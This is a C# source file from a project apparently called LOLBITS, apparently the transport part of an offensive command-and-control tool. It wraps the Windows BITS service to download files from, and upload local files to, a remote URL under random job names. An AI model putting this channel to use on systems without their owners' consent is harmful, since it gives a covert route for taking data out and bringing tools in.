using System;
using System.Linq;
using BITS = BITSReference2_5;

namespace LOLBITS
{
    public  class Jobs
    {
        private static readonly Random Random = new Random();
        private readonly object _url;
        private enum JobType {Download=0, Upload=1, UploadReply=2};

        public Jobs(object url)
        {
            _url = url;
        }

        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[Random.Next(s.Length)]).ToArray());
        }

        private static bool CreateJob(int type, out BITS.GUID jobGuid, out BITS.IBackgroundCopyJob job)
        {

            var mgr = new BITS.BackgroundCopyManager2_5();
            var randJobName = RandomString(15);
            switch (type)
            {
                case 0:
                    mgr.CreateJob(randJobName, BITS.BG_JOB_TYPE.BG_JOB_TYPE_DOWNLOAD, out jobGuid, out job);
                    break;
                case 1:
                    mgr.CreateJob(randJobName, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job);
                    break;
                case 2:
                    mgr.CreateJob(randJobName, BITS.BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD_REPLY, out jobGuid, out job);
                    break;
                default:
                    jobGuid = new BITS.GUID();
                    job = null;
                    break;
            }

            return job != null;
        }

        private static bool ExecuteJob(BITS.IBackgroundCopyJob job)
        {
            var jobIsFinal = false;
            var jobCompleted = false;
            while (!jobIsFinal)
            {
                job.GetState(out var state);
                switch (state)
                    {
                        case BITS.BG_JOB_STATE.BG_JOB_STATE_ERROR:
                            job.Cancel();
                            break;
                        case BITS.BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED:
                            job.Complete();
                            jobCompleted = true;
                            break;
                        case BITS.BG_JOB_STATE.BG_JOB_STATE_CANCELLED:
                            jobIsFinal = true;
                            break;
                        case BITS.BG_JOB_STATE.BG_JOB_STATE_ACKNOWLEDGED:
                            jobIsFinal = true;
                            break;
                        default:
                            break;
                    }
            }

            return jobCompleted ? true : false;
        }
        
        public bool Get(string id, string filePath, string headers, BITS.BG_JOB_PRIORITY priority)
        {
            CreateJob((int)JobType.Download, out BITS.GUID jobGuid, out BITS.IBackgroundCopyJob job);
            job.SetPriority(priority);
            job.AddFile(_url + id, @filePath);

            if(headers != null)
            {
                var jobHttpOptions = job as BITS.IBackgroundCopyJobHttpOptions;
                jobHttpOptions?.SetCustomHeaders(headers);
            }
            
            //job.SetNoProgressTimeout(5); how many seconds?
            job.Resume();
            return ExecuteJob(job);
        }

        public bool Send(string id, string filePath)
        {
            CreateJob((int)JobType.Upload, out BITS.GUID jobGuid, out BITS.IBackgroundCopyJob job);
            job.AddFile(_url + id, @filePath);
            job.Resume();

            return ExecuteJob(job);
        }
    }
}
